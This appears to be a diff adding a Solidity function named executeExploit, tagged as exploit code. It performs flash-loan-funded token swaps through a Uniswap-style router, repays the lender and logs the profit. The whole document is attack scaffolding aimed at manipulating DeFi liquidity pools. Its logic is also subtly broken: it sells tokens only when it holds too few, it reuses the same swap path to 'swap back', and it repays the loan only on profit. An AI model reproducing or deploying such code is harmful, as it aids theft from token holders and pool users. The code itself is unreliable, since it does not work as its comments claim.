@@ -1,0 +1,41 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start by selling the valuable token for WBNB (base token) to increase reserves
+    uint256 currentReserve = valuableToken.balanceOf(address(this));
+    if (currentReserve < amount) {
+        valuableToken.approve(address(uniswapRouter), amount);
+        // Sell valuable tokens for WBNB
+        uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            amount,
+            0,
+            path,
+            address(this),
+            block.timestamp + 1000
+        );
+    }
+
+    // Use the WBNB obtained to perform operations, for example, adding liquidity or swapping again
+    uint256 wbnbBalance = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
+    if (wbnbBalance > 0) {
+        // For instance, we could swap back WBNB to obtain more valuable tokens
+        IERC20(uniswapRouter.WETH()).approve(address(uniswapRouter), wbnbBalance);
+        uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            wbnbBalance,
+            0,
+            path,
+            address(this),
+            block.timestamp + 1000
+        );
+    }
+
+    // Ending with transferring back valuable token to self, when balance after swap exceeds the borrowed amount.
+    uint256 newBalance = valuableToken.balanceOf(address(this));
+    if (newBalance > amount) {
+        valuableToken.transfer(flashloanProvider, amount); // Repay original loan
+        uint256 profit = newBalance - amount; // Calculate profit
+        console.log("Profit: ", profit);
+    }
+}
+</executeExploitCode>
+```
